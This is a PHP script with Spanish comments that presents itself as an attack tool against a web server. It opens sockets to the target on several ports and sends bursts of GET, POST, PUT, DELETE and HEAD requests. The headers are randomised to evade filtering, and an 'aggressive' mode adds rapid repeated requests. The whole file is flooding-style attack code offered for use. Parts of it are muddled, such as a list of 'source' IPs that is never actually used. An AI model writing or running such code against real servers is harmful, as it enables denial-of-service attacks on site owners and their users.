<?php
$server = "www.example.com";
$ip_list = array(
    "192.168.0.1",
    "192.168.0.2",
    "192.168.0.3"
);

// Lista de puertos alternativos a los cuales redirigir el tráfico
$ports = array(80, 8080, 443, 8081, 3000);

// Inicialización de la red de servidores en la cual se realizará el ataque
echo "Inicializando ataque a $server\n";

// Función para crear una solicitud HTTP con evasión
function create_request($method, $server, $port) {
    $user_agents = array(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (iPhone 13 Pro) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.2 Safari/604.1",
    );

    $accept_language = array(
        "en-US,en;q=0.5", "es-ES,es;q=0.9", "fr-FR,fr;q=0.8"
    );
    
    $referer = array(
        "https://www.google.com", "https://www.bing.com", "https://duckduckgo.com"
    );

    // Construir la solicitud con la evasión de headers
    $request = $method . " / HTTP/1.1\r\n" .
               "Host: $server\r\n" .
               "User-Agent: " . $user_agents[array_rand($user_agents)] . "\r\n" .
               "Accept-Language: " . $accept_language[array_rand($accept_language)] . "\r\n" .
               "Referer: " . $referer[array_rand($referer)] . "\r\n" .
               "Connection: close\r\n\r\n";

    return $request;
}

// Función para realizar un ataque con múltiples métodos HTTP
function attack($ip_list, $server, $ports, $aggressive = false) {
    foreach ($ip_list as $ip) {
        foreach ($ports as $port) {
            $sock = socket_create(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (!$sock) {
                echo "Error al crear el socket para la IP: $ip\n";
                continue;
            }

            // Conexión al servidor y puerto
            if (!socket_connect($sock, $server, $port)) {
                echo "Error conectando a $server:$port desde $ip\n";
            } else {
                echo "Conexión exitosa a $server:$port desde $ip\n";

                // Determinar el método de ataque (pasivo o agresivo)
                $methods = array('GET', 'POST', 'PUT', 'DELETE', 'HEAD');
                foreach ($methods as $method) {
                    $request = create_request($method, $server, $port);
                    // Enviar el mensaje
                    if (!socket_send($sock, $request, strlen($request), 0)) {
                        echo "Error al enviar mensaje $method desde $ip:$port\n";
                    } else {
                        echo "Solicitud $method enviada desde $ip:$port\n";
                    }

                    // Si es un ataque agresivo, enviar múltiples solicitudes rápidamente
                    if ($aggressive) {
                        for ($j = 0; $j < 20; $j++) {
                            $retry_request = create_request($methods[array_rand($methods)], $server, $port);
                            if (!socket_send($sock, $retry_request, strlen($retry_request), 0)) {
                                echo "Error al reintentar mensaje desde $ip:$port\n";
                            }
                        }
                    }
                }

                // Cerrar el socket para el servidor objetivo
                socket_close($sock);
                echo "Socket cerrado para $ip:$port\n";
            }
        }
    }
}

// Función para realizar ataque pasivo
function passive_attack($ip_list, $server, $ports) {
    echo "Ejecutando ataque pasivo\n";
    attack($ip_list, $server, $ports, false);  // Ataque pasivo con pocos intentos
}

// Función para realizar ataque agresivo
function aggressive_attack($ip_list, $server, $ports) {
    echo "Ejecutando ataque agresivo\n";
    attack($ip_list, $server, $ports, true);  // Ataque agresivo con múltiples reintentos
}

// Selección de tipo de ataque (pasivo o agresivo)
$type_of_attack = isset($argv[1]) && $argv[1] == 'aggressive' ? 'aggressive' : 'passive';

if ($type_of_attack == 'passive') {
    passive_attack($ip_list, $server, $ports);
} else {
    aggressive_attack($ip_list, $server, $ports);
}

?>
